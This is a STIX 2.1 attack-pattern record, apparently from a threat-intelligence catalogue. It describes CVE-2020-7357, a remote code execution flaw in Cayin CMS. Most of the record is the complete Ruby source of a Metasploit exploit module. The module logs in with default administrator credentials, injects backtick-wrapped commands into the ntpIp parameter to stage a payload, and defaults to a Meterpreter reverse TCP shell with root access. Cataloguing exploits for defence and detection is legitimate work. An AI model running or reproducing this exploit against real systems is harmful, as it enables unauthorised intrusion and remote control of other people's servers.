{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e503dd22-675f-4c8a-abb4-da3d2fb3ad1c",
    "created": "2024-08-14T17:02:19.249651Z",
    "modified": "2024-08-14T17:02:19.249655Z",
    "name": "Cayin CMS NTP Server RCE",
    "description": " This module exploits an authenticated RCE in Cayin CMS <= 11.0. The RCE is executed in the system_service.cgi file's ntpIp Parameter. The field is limited in size, so repeated requests are made to achieve a larger payload. Cayin CMS-SE is built for Ubuntu 16.04 (20.04 failed to install correctly), so the environment should be pretty set and not dynamic between targets. Results in root level access.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/cayin_cms_ntp.rb",
            "external_id": "cayin_cms_ntp.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5571.php"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-7357"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Cayin CMS NTP Server RCE',\n        'Description' => %q{\n          This module exploits an authenticated RCE in Cayin CMS <= 11.0. The RCE is executed\n          in the system_service.cgi file's ntpIp Parameter. The field is limited in size, so\n          repeated requests are made to achieve a larger payload.\n          Cayin CMS-SE is built for Ubuntu 16.04 (20.04 failed to install correctly), so the\n          environment should be pretty set and not dynamic between targets.\n          Results in root level access.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die', # msf module\n          'Gjoko Krstic (LiquidWorm) <gjoko@zeroscience.mk>' # original PoC, discovery\n        ],\n        'References' => [\n          [ 'EDB', '48553' ],\n          [ 'URL', 'https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5571.php' ],\n          [ 'CVE', '2020-7357' ]\n        ],\n        'Platform' => ['linux'],\n        'DefaultOptions' => {\n          'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp'\n        },\n        'Privileged' => true,\n        'Arch' => [ARCH_X86, ARCH_X64],\n        'Targets' => [\n          [ 'Automatic Target', {}]\n        ],\n        'DisclosureDate' => '2020-06-04',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK, CONFIG_CHANGES]\n        }\n      )\n    )\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptString.new('TARGETURI', [true, 'The URI of Cayin CMS', '/']),\n        OptString.new('USERNAME', [true, 'Username to login with', 'administrator']),\n        OptString.new('PASSWORD', [true, 'Username to login with', 'admin']),\n        # from the original advisory, leaving here just in case\n        # OptString.new('USERNAME', [true, 'Username to login with', 'webadmin'])\n        # OptString.new('PASSWORD', [true, 'Username to login with', 'bctvadmin'])\n      ]\n    )\n  end\n\n  def check\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'cgi-bin', 'login.cgi')\n    )\n\n    if res.nil? || res.code != 200\n      return CheckCode::Safe('Could not connect to the web service, check URI Path and IP')\n    end\n\n    if res.body.include?('var model = \"CMS') && res.body.include?('STR_CAYIN_LOGO')\n      print_good('Cayin CMS install detected')\n      return CheckCode::Detected\n    end\n\n    CheckCode::Safe\n  rescue ::Rex::ConnectionError\n    CheckCode::Safe('Could not connect to the web service, check URI Path and IP')\n  end\n\n  def login\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'cgi-bin', 'login.cgi'),\n      'method' => 'POST',\n      'vars_post' => {\n        'apply_mode' => 'login',\n        'lang' => 'ENG',\n        'username' => datastore['USERNAME'],\n        'password' => datastore['PASSWORD']\n      }\n    )\n\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n\n    # instead of a 302 like most apps, this does a script window.location to forward...\n    unless res.code == 200 && res.body.include?('/cgi-bin/system_status.cgi')\n      fail_with(Failure::BadConfig, \"#{peer} - Login failed. Check username and password\")\n    end\n\n    res.get_cookies\n  end\n\n  def execute_command(cmd, _opts = {})\n    # originally attempted to use the 'test' functionality, however it attempts 3 times which\n    # means our exploit code stage chunks are written 3 times.\n    # also attempted to just 'save', however it doesn't execute an update.\n    # 'update' was the prefered functionality\n    send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'cgi-bin', 'system_service.cgi'),\n      'method' => 'POST',\n      'cookie' => \"#{@cookie} sys=Service\",\n      'vars_post' => {\n        'exe' => 'webSvrUpdateNtp',\n        'ntpIp' => \"`#{cmd}`\"\n\n        # test button, executes 3 times\n        # 'exe' => 'webSvrTestNtp', # just do the 'test', doesnt change config and still runs\n        # 'ntpIp' => \"`#{cmd}`\"\n\n        # save button, but doesnt execute\n        # 'save' => 'webSvrNtp',\n        # 'ntpIp' => \"`#{cmd}`\",\n        # 'ntpEnable' => 1,\n        # 'ntp_server' => 0\n      }\n    )\n  end\n\n  def exploit\n    if check != CheckCode::Detected\n      fail_with(Failure::NotVulnerable, 'Target is not vulnerable')\n    end\n\n    @cookie = login\n    execute_cmdstager(flavor: :printf, linemax: 200)\n  rescue ::Rex::ConnectionError\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to the web service\")\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2020-06-04",
    "x_mitre_platforms": [
        "['linux']"
    ]
}